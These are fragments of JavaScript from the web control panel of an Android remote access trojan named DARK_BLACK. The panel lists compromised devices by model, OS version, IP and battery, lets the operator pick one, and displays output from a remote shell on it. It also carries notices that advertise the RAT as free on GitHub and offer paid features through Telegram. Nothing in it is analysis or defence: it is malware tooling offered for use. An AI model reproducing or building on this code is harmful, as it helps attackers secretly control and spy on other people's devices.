...
uo2.innerHTML+='<br><div class="usr" >'+model+' <span style="float:right" >'+aversion+'</span><br><br>Rooted: '+ip+' <span style="float:right" >Battery: '+battery+' </span><br><br><center><button onclick="setdev('+"'"+uid+"'"+')">FUCK</button></center></div> '; 
}
}
else{
...
pd3.innerHTML="<center> <h3 style='color:red'>•Notice•<h3> </center><br>This is an Open Source RAT named <b style='color:gold'>DARK_BLACK</b>available for free on <a href='https://github.com/darkblackorganization' style='color:#0f8;'>GitHub</a>. Reselling , Changing Brand Name , Logo  of free version are strictly prohibited.";
...
pd1.innerHTML="Want More Features Contact at <a href='https://t.me/darkblackorganization' style='color:#0f8;'>DARK_BLACK</a>";
...
pd.innerHTML="&copy; darkblackorganization";
...
$("#shellcmd").css("display","block");
$("#shelldata").html("DARK_BLACK Shell<br><br>"+o.replaceAll("\n","<br>"))
